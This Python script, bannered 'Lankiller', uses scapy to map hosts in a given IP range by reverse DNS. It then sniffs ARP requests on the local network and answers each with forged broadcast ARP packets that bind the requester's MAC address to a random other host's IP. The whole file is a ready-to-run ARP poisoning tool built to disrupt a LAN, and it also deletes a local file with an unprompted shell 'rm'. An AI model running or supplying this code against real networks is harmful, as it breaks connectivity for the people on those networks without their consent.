from multiprocessing.dummy import Pool
from datetime import datetime
import itertools, socket, sys, netifaces, logging, os, random
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
	from scapy.all import *
except ImportError:
	print("ERROR: Please install scapy\n")
	exit(-1)

banner = """
           _                _    _ _ _           (v 1.0.0)
          | |    __ _ _ __ | | _(_) | | ___ _ __ 
          | |   / _` | '_ \| |/ / | | |/ _ \ '__|
          | |__| (_| | | | |   <| | | |  __/ |   
          |_____\__,_|_| |_|_|\_\_|_|_|\___|_|   
                                       
         """

iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
gwip = '192.168.1.254'

os.system("rm ips")

print("\033[1;33m{}\033[00m".format(banner))
print("\033[1;94m[+]\033[00m Starting up: \033[1;31m{0}\033[00m".format(str(datetime.now())))
print("\033[1;94m[+]\033[00m IP: \033[1;31m{0}\033[00m IFACE: \033[1;31m{1}\033[00m".format(ip, iface))

def sock_scan(addr):
	try:
	   print("\t", addr," \033[1;32m-->\033[00m ", socket.gethostbyaddr(addr)[0])
	   with open("ips", 'a') as file:
	      file.write('\n'+addr)

	except socket.herror:
		return
	except KeyboardInterrupt:
		return
	except Exception as error:
		pass

try:      
   address = sys.argv[1]
except IndexError:
   print("Invalid IP range")
   exit(-1)

print("\033[1;94m[+]\033[00m Starting Host Scan:\n")
addr = address.replace('*', '%s')
addrs = [addr % i for i in itertools.product(range(255), repeat=addr.count('%s'))]
pool = Pool(200)
result=[i for i in pool.map(sock_scan, addrs) if i]

sock_scan(address)

print("\n\033[1;94m[+]\033[00m Host Scan Finished")

try:
   ips = open('ips', 'r')
except FileNotFoundError:
   print("\033[1;31m[!]\033[0m FATAL ERROR: No Ips detected\n")
   exit(-1)

lines = ips.readlines()

if len(lines) > 0:
	print("\033[1;94m[+]\033[00m IPs saved to file")

else:
	print("\033[1;31m[!]\033[0m FATAL ERROR: No Ips saved to outfile\n")

def p0ison(mac, req_src):
	total_bytes = os.stat('ips').st_size 
	random_point = random.randint(0, total_bytes)
	file = open('ips', 'r')
	file.seek(random_point)
	file.readline()
	fake_ip = file.readline()
	if len(fake_ip) > 0:
		sendp(Ether(dst="ff:ff:ff:ff:ff:ff",src="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=mac,pdst=fake_ip), verbose=False)
		print("\033[1;94m[+]\033[00m \033[1;31mSENT:\033[0m", mac, "has", fake_ip)
	else:
		pass

def killer(pkt):
	try:
		arp = pkt[ARP]
		if arp.op == 1:
			print("\033[1;94m[+]\033[00m", arp.psrc, "is asking about", arp.hwsrc)
			p0ison(arp.hwsrc, arp.psrc)
	except Exception as e:
		pass

	

print("\033[1;94m[+]\033[00m Letting the Killer lose")
pkt = sniff(prn=killer, filter='arp')
